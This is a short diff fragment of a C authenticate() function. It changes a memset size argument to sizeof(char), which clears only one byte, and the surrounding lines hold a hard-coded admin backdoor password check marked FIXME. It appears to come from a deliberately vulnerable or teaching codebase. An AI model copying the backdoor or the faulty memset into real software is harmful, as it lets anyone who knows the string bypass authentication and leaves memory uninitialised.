@@ -330,7 +330,7 @@ int authenticate(FILE *logfile, char *user, char *pass)
 	int ret;
 	// changing the size of in line 318 to k?
 	//memset(path, 0, sizeof(1024));
-	memset(path, 0, sizeof(1024));
+	memset(path, 0, sizeof(char));
 
 	/* FIXME: hard coded admin backdoor for password recovery */	
 	if (memcmp(pass, "baCkDoOr", 9) == 0)
